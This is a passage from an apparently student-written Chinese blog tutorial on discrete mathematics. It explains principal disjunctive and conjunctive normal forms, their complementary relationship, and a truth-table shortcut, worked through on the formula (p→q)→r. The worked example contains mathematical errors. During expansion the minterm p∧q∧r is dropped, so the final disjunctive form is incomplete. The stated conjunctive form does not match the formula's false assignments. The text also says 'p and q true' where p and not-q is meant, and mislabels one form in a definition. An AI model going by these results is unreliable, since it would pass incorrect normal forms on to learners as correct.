\land \neg q \land r)\vee (p \land \neg q \neg r)\vee (\neg p \land q \land \neg r)</script><p>​    可见，每一个括号中都存在与$p$相关、与$q$相关、与$r$相关的文字，其为主范式。</p><h4 id="2-2-主范式的简单理解"><a href="#2-2-主范式的简单理解" class="headerlink" title="2.2 主范式的简单理解"></a>2.2 主范式的简单理解</h4><p>​    先放出合取和析取的真值表：</p><div class="table-container"><table><thead><tr><th style="text-align:center">$p$</th><th style="text-align:center">$q$</th><th style="text-align:center">$p \land q$</th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th style="text-align:center">$p$</th><th style="text-align:center">$q$</th><th style="text-align:center">$p \vee q$</th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr></tbody></table></div><p>​    在以上两个真值表中，我们可以看出，在合取时，至少一项为假，公式为假；在析取时，至少一项为真，公式为真。</p><p>​    根据合取和析取的性质，主合取范式就可以理解为：这是一个表明<strong>公式为假</strong>时所有变元取值情况的式子；主析取范式也可以理解为：这是一个表明<strong>公式为真</strong>时所有变元取值情况的式子。</p><p>​    同时，我们可以将主范式中每一个公式中文字理解为：原文字（如$p$,$q$）即表示<strong>1/0</strong>，其相反文字（如$\neg p $,$\neg q$）即表示<strong>0/1</strong>。</p><p>​    那么，主范式可以这样理解：</p><p>​    <strong>主合取范式</strong>：将范式中的每一个公式中文字提取出来写成集合形式，<strong>原文字表示0</strong>，<strong>相反文字表示1</strong>，主合取范式即表示<strong>公式为假</strong>时变元取值情况。</p><p>​    <strong>主析取范式</strong>：将范式中的每一个公式中文字提取出来写成集合形式，<strong>原文字表示1</strong>，<strong>相反文字表示0</strong>，主合取范式即表示<strong>公式为真</strong>时变元取值情况。</p><p>​    同样的，<strong>范式</strong>也可以这样理解。</p><h3 id="3、如何优雅的写出主范式"><a href="#3、如何优雅的写出主范式" class="headerlink" title="3、如何优雅的写出主范式"></a>3、如何<del>优雅</del>的写出主范式</h3><h4 id="3-1-主析取范式和主合取范式之间的关系"><a href="#3-1-主析取范式和主合取范式之间的关系" class="headerlink" title="3.1 主析取范式和主合取范式之间的关系"></a>3.1 主析取范式和主合取范式之间的关系</h4><p>​    我们可以得出以下结论：</p><p>​    主析取范式和主合取范式的<strong>公式</strong>数量之和等于$2^n$，其中$n$为变元的数量，且两个范式中的公式<strong>“互补”</strong>。</p><p>​    <strong>公式</strong>：指上文主范式定义中提到的$A_i$；</p><p>​    <strong>互补</strong>：指两个式子中包含的每个公式中的文字组合的相关性，例如：</p><script type="math/tex; mode=display">p \vee q的主合取范式为p \vee q，主析取范式为(p \land \neg q )\vee (\neg p \land  q)\vee (p \land  q)</script><p>​    在上例中，可知<strong>主合取范式</strong>中公式包含的文字组合的集合为$\left\{(p,q)\right\}$，<strong>主析取范式</strong>中公式包含的文字组合的集合为$\left\{(p,\neg q),(\neg p , q),( p , q)\right\}$，我们设文字组合集合的<strong>全集</strong>为</p><script type="math/tex; mode=display">\left\{(p,\neg q),(\neg p , q),( \neg p ,\neg q),(p,q)\right\}</script><p>​    我们可以发现，<strong>主析取范式</strong>中文字组合的集合，为<strong>主合取范式</strong>文字组合的集合在全集中的补集<strong>取反</strong>（即将每一个文字变为其相反文字，如：$p$变成$\neg p$；可由2.2结论易知），这样我们这样我们称其<strong>互补</strong>，所有的主析取范式和主合取范式均遵循这样的规律。所以，在求取主范式的过程中，我们只需要算出主析取范式<strong>或</strong>主合取范式的<strong>其中一个</strong>就可以。</p><h4 id="3-2-从范式到主范式"><a href="#3-2-从范式到主范式" class="headerlink" title="3.2 从范式到主范式"></a>3.2 从范式到主范式</h4><p>​    拿到一个式子，我们需要进行等值演算。而在将公式变为只由$\left\{\neg,\vee,\land\right\}$表示之后，我们便可以由2.2的简单理解去对范式进行变形，不用运用分配律进行复杂的等值验算。这里引入离散第三周作业中的例子：</p><script type="math/tex; mode=display">求合式公式 ( p \to q)\to r的主析取范式和主合取范式</script><p>​    首先我们将该合式公式进行等值演算，消除掉其中的$\to$，这里需要用到0.1与0.2的知识。</p><script type="math/tex; mode=display">\begin{align}(p \to q)\to r &\Leftrightarrow \neg (\neg p \vee q)\vee r\\&\Leftrightarrow (p\land \neg q )\vee r\end{align}</script><p>​    可见，我们只用了两步就可以将这个式子转化为析取范式的形式，接下来，我们可以使用<del>奇技淫巧</del>来将其转化成主析取范式。</p><p>​    根据2.2，我们可以将该范式理解为：当$p$与$q$为真时，或者$r$为真时，公式为真。换言之，当$p$与$q$为真时，或者$r$为真时，无论剩下变量如何取值，该公式为真。</p><p>​    又由于根据2.2，主析取范式可以理解为在公式为真的时候所有变量的取值，那么我们不再需要计算，直接将公式写出即可：</p><script type="math/tex; mode=display">\begin{align}&\left\{(p \land \neg q)\right\}\vee \left[r\right]\\\Leftrightarrow &\left\{(p \land \neg q \land r)\vee(p \land \neg q \land \neg r)\right\}\\&\vee\left[(p \land q \land r) \vee (\neg p \land q\land r)\vee (\neg p \land \neg q \land r)\vee(p \land \neg q\land r)\right]\\\Leftrightarrow&\left\{(p \land \neg q \land r)\vee(p \land \neg q \land \neg r)\right\}\vee\left[(\neg p \land q\land r)\vee (\neg p \land \neg q \land r)\vee(p \land \neg q\land r)\right]\\\Leftrightarrow&\left\{ p \land \neg q \land \neg r\right\}\vee \left[(\neg p \land q\land r)\vee (\neg p \land \neg q \land r)\vee(p \land \neg q\land r)\right]\end{align}</script><p>​    我们只需要将大括号包括的部分与小括号包括的部分根据2.2的理解简单扩充，并且根据<strong>幂等律</strong>进行消元，便可写出其主析取范式。</p><p>​    再根据3.1的<strong>互补</strong>的性质可知，可写根据真值表或全集补集写出主合取范式：</p><script type="math/tex; mode=display">(p \vee q \vee r)\land (p \vee\neg q \vee r)\land(\neg p \vee q\vee r)\land(\neg p \vee \neg q \vee \neg r)</script><p>​    </p><p>这里建议使用真值表（<del>因为我就是这么做的</del>）：</p><p>step1    </p><p>0    0    0</p><p>0    0    1</p><p>0    1    0</p><p>0    1    1</p><p>1    0    0</p><p>1    0    1</p><p>1    1    0</p><p>1    1    1                        </p><p>step2    </p><p>0    0    0</p><p><del>0    0    1</del></p><p>0    1    0</p><p><del>0    1    1</del></p><p>1    0    0</p><p><del>1    0    1</del></p><p><del>1    1    0</del></p><p>1    1    1                        </p><p>step3</p><p>0    0    0$\to$  $ p \quad q \quad r$</p><p><del>0    0    1</del></p><p>0    1    0$\to$  $ p \quad \neg q \quad r$</p><p><del>0    1    1</del></p><p>1    0    0 $\to$  $\neg p \quad q \quad r$</p><p><del>1    0    1</del></p><p><del>1    1    0</del></p><p>1    1    1$\to $ $\neg p \quad \neg q \quad \neg r$</p><p>（从合取到析取也是同样，但是要注意2.2中<strong>0和1</strong>的转换）    </p><p>​    同时，根据真值表方法我们可以看出，直接使用真值表也可以很快的写出主析取范式和主合取范式，当然这样有一定的计算难度，仅适用于简单的公式。</p><p>​    自此，我们完成了<del>奇技淫巧</del>的使用。虽然看起来很无用，但是不用分配律真的很爽。</p>]]></content>
    
    
    
    <tags>
      
      <tag>离散数学</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
